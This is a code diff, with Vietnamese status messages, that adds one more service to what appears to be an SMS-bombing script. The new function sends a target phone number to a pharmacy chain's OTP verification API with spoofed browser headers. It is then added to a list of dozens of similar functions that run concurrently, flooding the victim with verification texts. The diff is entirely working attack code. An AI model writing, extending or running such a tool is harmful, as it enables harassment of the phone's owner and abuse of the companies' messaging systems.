@@ -4338,6 +4338,45 @@ def aeoneshop():
     except requests.exceptions.RequestException:
         print("AEONESHOP | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
+def fptlongchausms():
+    headers = {
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'access-control-allow-origin': '*',
+        'content-type': 'application/json',
+        'order-channel': '1',
+        'origin': 'https://nhathuoclongchau.com.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://nhathuoclongchau.com.vn/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-channel': 'EStore',
+    }
+
+    json_data = {
+        'phoneNumber': sdt,
+        'otpType': 0,
+        'fromSys': 'WEBKHLC',
+    }
+
+    try:
+        response = requests.post(
+            'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
+            headers=headers,
+            json=json_data,
+        )
+        print(response.text)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("FPTLONGCHAUSMS | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("FPTLONGCHAUSMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+
 
 functions = [
     tv360, beautybox, kingfood, batdongsan, xanhsmzl, futabus, galaxyplay,
@@ -4355,7 +4394,7 @@ functions = [
     vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
     hoasenhome, bibomart, sbiz, thieuhoa, dchic, yvesrocher, guardian,
     leflair, vayvnd, bibabo, mocha35, xanhsm2, lixibox, boshop,
-    innisfree, aeoneshop
+    innisfree, aeoneshop, fptlongchausms
 ]
 
 with concurrent.futures.ThreadPoolExecutor() as executor:
